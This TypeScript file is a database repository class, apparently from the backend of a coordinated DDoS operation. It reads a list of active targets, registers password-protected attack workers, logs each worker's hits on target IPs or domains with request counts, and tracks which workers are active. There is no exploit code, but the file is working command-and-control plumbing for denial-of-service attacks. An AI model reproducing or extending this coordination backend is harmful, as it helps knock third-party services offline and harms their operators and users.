import { provide } from 'inversify-binding-decorators'
import { inject } from 'inversify'
import { v4 as uuidv4 } from 'uuid'

import { InvalidWorkerPasswordException } from 'domain/exceptions/ddos/InvalidWorkerPasswordException'
import { WorkerNotFoundException } from 'domain/exceptions/ddos/WorkerNotFoundException'
import { DDOSWorker, DDOSWorkerDTO } from 'domain/ddos/DDOSWorkerDTO'

import { DDOSFactory } from 'infrastructure/factories/DDOSFactory'
import { checkAndSort } from 'infrastructure/utils'
import { Database } from 'infrastructure/db'

@provide(DDOSWorkerRepository)
export class DDOSWorkerRepository {
	@inject(Database)
	private readonly db!: Database

	public async getActiveTasks(): Promise<string[]> {
		const res = await this.db.query<{ target: string }>(`
        SELECT target
        FROM active_targets
		`)
		return res.map((t) => t.target)
	}

	public async upsertWorker(worker: DDOSWorkerDTO): Promise<DDOSWorker> {
		return this.db.wrapIntoTransaction(async () => {
			const [existingWorker] = await this.db.query<{ uuid: string; password: string }>(
				`
            SELECT uuid, password
            FROM ddos_workers
            WHERE uuid = $1
				`,
				[worker.uuid],
			)
			if (existingWorker && existingWorker.password !== worker.password) {
				throw new InvalidWorkerPasswordException({
					yourUUID: worker.uuid,
					yourPassword: worker.password || '<not-provided>',
				})
			}

			await this.db.query(
				`
            INSERT INTO ddos_workers(uuid, password, readable_name, processes_count)
            VALUES ($1, $2, $3, $4)
            ON CONFLICT
                DO UPDATE
                SET readable_name   = $3,
                    processes_count = $4
				`,
				[worker.uuid, uuidv4(), worker.readableName, worker.processesCount],
			)
			await this.db.query(
				`
            INSERT INTO ddos_tasks(worker_uuid, target, requests_count)
            SELECT $1, UNNEST($2::TEXT[]), UNNEST($3::INT[])
				`,
				[
					worker.uuid,
					worker.executedTasks.map((t) => t.ipAddressOrDomain),
					worker.executedTasks.map((t) => t.requestsCount),
				],
			)

			return (await this.getActiveWorkersByUUIDs([worker.uuid], true))[0]
		})
	}

	public async getActiveWorkers(minutesInterval: number): Promise<DDOSWorker[]> {
		const res = await this.db.query<{ uuid: string }>(
			`
          SELECT uuid
          FROM ddos_workers
          WHERE last_active >= (CURRENT_TIMESTAMP - INTERVAL '1 minute' * $1)
			`,
			[minutesInterval],
		)
		return this.getActiveWorkersByUUIDs(
			res.map((r) => r.uuid),
			false,
		)
	}

	public async getActiveWorkersByUUIDs(
		uuids: string[],
		withPassword: boolean,
	): Promise<DDOSWorker[]> {
		const res = await this.db.query(
			`
          SELECT ddos_workers.*, ARRAY_AGG(tasks) AS tasks
          FROM ddos_workers
                   LEFT JOIN ddos_tasks tasks ON ddos_workers.uuid = tasks.worker_uuid
          WHERE ddos_workers.uuid = ANY ($1)
          GROUP BY ddos_workers.uuid
			`,
			[uuids],
		)
		return checkAndSort({
			requestedIds: uuids,
			res,
			idKey: 'uuid',
			exceptionClass: WorkerNotFoundException,
		}).map((raw) => DDOSFactory.fromRaw(raw, withPassword))
	}
}
